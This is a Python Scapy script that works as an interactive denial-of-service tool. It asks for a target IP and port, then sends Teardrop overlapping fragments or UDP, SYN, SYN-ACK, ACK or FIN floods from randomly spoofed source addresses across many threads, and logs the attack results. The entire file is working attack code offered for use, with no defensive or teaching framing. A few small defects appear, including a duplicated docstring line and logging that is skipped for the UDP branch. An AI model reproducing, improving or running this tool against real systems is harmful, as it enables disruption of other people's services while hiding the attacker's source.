# Import necessary libraries
from scapy.all import *
from scapy.layers.inet import TCP, IP, UDP
import random
import threading
import time
from tqdm import tqdm
import socket
import struct

# Global variables for tracking sent packets and time
sent_packets = 0
start_time = 0

# Locks for thread-safe access to shared variables
sent_packets_lock = threading.Lock()

# Function to log attack results
def log_results(attack_type, packets_sent, duration):
    """
    Logs the attack results, including attack type, number of packets sent, and attack duration, into a file.
    Args:
        attack_type (str): Type of attack.
        packets_sent (int): Number of packets sent during the attack.
        duration (float): Duration of the attack in seconds.
    """
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    with open("attack_results.txt", "a") as file:
        file.write(f"Timestamp: {timestamp}\n")
        file.write(f"Attack Type: {attack_type}\n")
        file.write(f"Packets Sent: {packets_sent}\n")
        file.write(f"Duration: {duration} seconds\n")
        file.write("=" * 50 + "\n")

# Function to generate a random IP address
def generate_random_ip():
    """
    Generates a random IP address.
    Returns:
        str: Random IP address.
    """
    return socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))

# Function for Tear Drop attack
def send_tear_drop_packet(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends Tear Drop attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        # Create overlapping fragments for Tear Drop attack
        frag1 = IP(src=source_ip, dst=server_ip, flags=1, frag=0) / UDP(dport=server_port) / Raw(RandString(size=1480))
        frag2 = IP(src=source_ip, dst=server_ip, flags=1, frag=2) / UDP(dport=server_port) / Raw(RandString(size=1480))

        # Send the fragments
        send(frag1, verbose=0)
        send(frag2, verbose=0)

        # Update the number of sent packets in a thread-safe manner
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)

# Function for UDP flood attack
def send_udp_packet(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends UDP flood attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)

        # Create a UDP packet with randomized source IP and maximum payload size (1472 bytes)
        udp_packet = IP(src=source_ip, dst=server_ip) / UDP(dport=server_port) / Raw(RandString(size=1472))

        # Send the UDP packet
        send(udp_packet, verbose=0)

        # Update the number of sent packets in a thread-safe manner
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)  # Update every second

# Function for SYN flood attack
def syn_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends SYN flood attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)
        syn_flood = IP(src=source_ip, dst=server_ip) / TCP(dport=server_port, flags="S", seq=RandShort())

        # Send the SYN flood packet
        send(syn_flood, verbose=0)
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)

# Function for SYN-ACK flood attack
def synack_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends SYN-ACK flood attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)
        synack_flood = IP(src=source_ip, dst=server_ip) / TCP(dport=server_port, flags="SA", seq=RandShort())

        # Send the SYN-ACK flood packet
        send(synack_flood, verbose=0)
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)

# Function for ACK flood attack
def ack_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends ACK flood attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)
        ack_flood = IP(src=source_ip, dst=server_ip) / TCP(dport=server_port, flags="A", seq=RandShort())

        # Send the ACK flood packet
        send(ack_flood, verbose=0)
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)

# Function for FIN flood attack
def fin_flood_attack(server_ip, server_port, source_ips, count, progress_bar):
    """
    Sends FIN flood attack packets to the target server.
    Args:
        server_ip (str): IP address of the target server.
        server_port (int): Port number of the target server.
        source_ips (list): List of source IP addresses to use for the attack.
        count (int): Total number of packets to send.
        progress_bar (tqdm.tqdm): Progress bar to visualize packet sending progress.
    """
    global sent_packets, start_time
    while sent_packets < count:
        source_ip = random.choice(source_ips)
        fin_flood = IP(src=source_ip, dst=server_ip) / TCP(dport=server_port, flags="F", seq=RandShort())

        # Send the FIN flood packet
        send(fin_flood, verbose=0)
        with sent_packets_lock:
            sent_packets += 1

        # Update the progress bar
        progress_bar.update(1)
        progress_bar.set_postfix(PacketsSent=sent_packets)

        # Wait for 1 second before sending the next packet
        time.sleep(1)

# Main function
def main():
    global start_time
    server_ip = input("Server IP: ")
    server_port = int(input("Server port: "))
    Protocol = int(input("Choose an attack: \n1. UDP\n2. TCP\nEnter the protocol number: "))
    if Protocol == 1:  # UDP Attacks
        attack_number = int(input("Choose an attack: \n1. Tear Drop\n2. Maximum Packet Size\nEnter the attack number: "))
        number_of_packets = int(input("Enter the number of times to execute the attack: "))
        number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))

        source_ips = []  # List of source IP addresses to use

        # Generate random source IP addresses
        for _ in range(number_of_source_ips):
            source_ips.append(generate_random_ip())

        start_time = time.time()  # Record the start time

        with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
            threads = []

            if attack_number == 1:
                attack_type = "Tear Drop"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=send_tear_drop_packet,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            elif attack_number == 2:
                attack_type = "Maximum Packet Size"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=send_udp_packet,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            # Wait for all threads to finish
            for thread in threads:
                thread.join()
    elif Protocol == 2:  # TCP Attacks
        attack_number = int(input("Choose an attack: \n1. Syn Flood Attack\n2. Syn-Ack Flood Attack\n3. Ack Flood Attack\n4. Fin Flood Attack\nEnter the attack number: "))
        number_of_packets = int(input("Enter the number of times to execute the attack: "))
        number_of_source_ips = int(input("Enter the number of source IP addresses to generate: "))

        source_ips = []  # List of source IP addresses to use

        # Generate random source IP addresses
        for _ in range(number_of_source_ips):
            source_ips.append(generate_random_ip())

        start_time = time.time()  # Record the start time

        with tqdm(total=number_of_packets, desc="Sending Packets", unit="pkt") as progress_bar:
            threads = []

            if attack_number == 1:
                attack_type = "Syn Flood"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=syn_flood_attack,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            elif attack_number == 2:
                attack_type = "Syn-Ack Flood"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=synack_flood_attack,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            elif attack_number == 3:
                attack_type = "Ack Flood"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=ack_flood_attack,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            elif attack_number == 4:
                attack_type = "Fin Flood"
                for _ in range(number_of_packets):
                    thread = threading.Thread(target=fin_flood_attack,
                                              args=(server_ip, server_port, source_ips, number_of_packets, progress_bar))
                    threads.append(thread)
                    thread.start()

            # Wait for all threads to finish
            for thread in threads:
                thread.join()

        # Calculate attack duration
        end_time = time.time()
        attack_duration = end_time - start_time

        # Log attack results to a file
        log_results(attack_type, number_of_packets, attack_duration)

# Entry point of the script
if __name__ == "__main__":
    main()
